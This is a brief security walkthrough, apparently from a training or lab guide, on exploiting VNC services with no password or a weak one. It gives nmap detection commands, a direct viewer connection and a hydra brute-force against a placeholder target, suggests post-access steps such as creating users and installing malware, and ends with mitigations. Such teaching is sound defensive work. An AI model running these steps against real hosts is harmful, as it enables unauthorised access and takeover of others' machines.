Full Walkthrough: VNC Weak Authentication
Theory & Background
Virtual Network Computing (VNC) provides a graphical desktop sharing system. A severe misconfiguration is running VNC without a password or with a weak, easily guessable password. Furthermore, older versions often transmit passwords and data in plaintext, making them susceptible to sniffing.

Step-by-Step Walkthrough
1. Identification
bash
nmap -p5900 -sV --script vnc-info,vnc-title <target_ip>
Expected Result: Nmap will identify the VNC service (e.g., RealVNC, TightVNC) and may even retrieve the desktop title, indicating no authentication.

2. Exploitation
bash
# 1. Connect using a VNC client (like xtightvncviewer)
xtightvncviewer <target_ip>:5900

# If it connects without a prompt, you have full control.
# If it prompts for a password, you need to brute-force it.

# 2. Brute-forcing with hydra
# Note: VNC brute-forcing is slow. The password is often weak.
hydra -P /usr/share/wordlists/rockyou.txt <target_ip> vnc -t 4

# 3. Once connected, you have a live graphical session.
# You can interact with the desktop, open terminals, and install malware.
What to do: Interact with the desktop as if you were physically at the machine. Create new users, open command prompts, and browse files.

3. Mitigation
Password Policy: Always set a strong, complex password for VNC services.

Encryption: Never use raw VNC over the internet. Always tunnel the connection through SSH (ssh -L 5900:localhost:5900 user@target_ip) or use VNC variants that support native encryption.

Access Control: Use a firewall to restrict VNC access to specific management IP addresses. Consider using a VPN for access.

Alternative: Evaluate if SSH with X11 forwarding (ssh -X) can meet your needs instead of a full VNC setup.
